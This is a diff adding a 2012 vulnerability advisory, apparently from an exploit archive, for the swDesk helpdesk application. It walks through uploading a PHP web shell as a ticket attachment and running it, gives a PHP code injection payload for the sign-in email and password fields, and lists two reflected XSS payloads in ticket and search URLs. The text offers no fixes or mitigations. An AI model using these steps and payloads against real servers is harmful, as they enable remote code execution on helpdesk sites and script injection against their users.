@@ -1,0 +1,29 @@
+# 
+# Title     : swDesk Multi Vulnerability
+# Author    : Red Security TEAM
+# Date      : 01/02/2012
+# Risk      : High
+# Vendor    : http://www.swdesk.com/
+# Tested On : Apache
+# Contact   : Info [ 4t ] RedSecurity [ d0t ] COM
+# Home      : http://RedSecurity.COM
+#
+# Exploit   :
+#
+# I. Arbitrary File Upload Vulnerability
+# 1. Go to http://server/create_ticket.php
+# 2. Fil all Input Fields And Click on Submit Ticket
+# 3. Click on the View Ticket and you should go to the link Like : http://server/view_ticket.php?email=[Your Email]&id=1
+# 4. You see Send Message box , Write any thing there and attach your PHP file in the Upload attachment and Click on Send Message
+# 5. You can see your attachment above Like : Attachment: shell.php , Click on it and you see your PHP code has been runed ;)
+#
+# II. PHP Code Injection Vulnerability
+# 1. Go to http://server/signin.php : Vulnerability Input Fields : email , password
+# 2. Write your php in Input Fields Like : phpi${@print(RedSecurityTEAM)}
+#
+# III. XSS Vulnerability
+# 1. http://server/view_ticket.php?email=example@example.com&id=" onmouseover=alert(1) bad="
+# 2. http://server/kb_search.php?keywords=" onmouseover=alert(1) bad="&mode=Search
+#
+# Thanks To : http://1337day.com/ , http://www.exploit-db.com/ , http://securityreason.com/ , http://packetstormsecurity.org/
+#
